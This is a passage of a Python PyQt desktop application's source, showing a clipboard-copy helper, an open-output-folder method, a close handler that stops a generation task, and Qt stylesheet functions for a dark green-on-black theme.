        if text:
            clipboard = QApplication.clipboard()
            clipboard.setText(text)
            self._append_output("[+] Copied!")

    def _open_output_folder(self):
        folder = self.output_path_input.text().strip()
        if not folder:
            folder = self.output_dir

        if os.path.exists(folder):
            if os.name == 'nt':
                os.startfile(folder)
            else:
                subprocess.Popen(['xdg-open', folder])
        else:
            QMessageBox.warning(self, "Warning", f"Folder not found:\n{folder}")

    def closeEvent(self, event):
        self._stop_generation()
        event.accept()

    # ─── Styling ──────────────────────────────────────────────────────────

    @staticmethod
    def _group_style(color="#00ff00"):
        return f"""
            QGroupBox {{
                color: {color};
                border: 1px solid #333333;
                border-radius: 4px;
                margin-top: 4px;
                padding-top: 8px;
                font-weight: bold;
                font-size: 9pt;
                background: #0a0a0a;
            }}
            QGroupBox::title {{
                subcontrol-origin: margin;
                left: 8px;
                padding: 0 8px;
                color: {color};
                background: #0a0a0a;
            }}
        """

    @staticmethod
    def _input_style():
        return """
            QLineEdit {
                background: #0d1117;
                color: #e6edf3;
                border: 1px solid #30363d;
                border-radius: 3px;
                padding: 3px 8px;
                font-family: 'Consolas', monospace;
                font-size: 9pt;
            }
            QLineEdit:focus { border-color: #007acc; }
            QLineEdit:disabled { color: #555555; background: #1a1a1a; }
        """

    @staticmethod
    def _combo_style():
        return """
            QComboBox {
                background: #0d1117;
                color: #e6edf3;
                border: 1px solid #30363d;
                border-radius: 3px;
                padding: 3px 8px;
                font-family: 'Consolas', monospace;
                font-size: 9pt;
            }
            QComboBox:hover { border-color: #007acc; }
            QComboBox::drop-down { border: none; }
            QComboBox QAbstractItemView {
                background: #0d1117;
                color: #e6edf3;
                selection-background-color: #1f6feb;
            }
            QComboBox:disabled { color: #555555; background: #1a1a1a; }
        """

    @staticmethod
    def _textarea_style():
        return """
            QTextEdit {
                background: #0d1117;
                color: #e6edf3;
                border: 1px solid #30363d;
                border-radius: 3px;
                padding: 4px;
                font-family: 'Consolas', monospace;
                font-size: 9pt;
            }
            QTextEdit:focus { border-color: #007acc; }
            QTextEdit:disabled { color: #555555; background: #1a1a1a; }
        """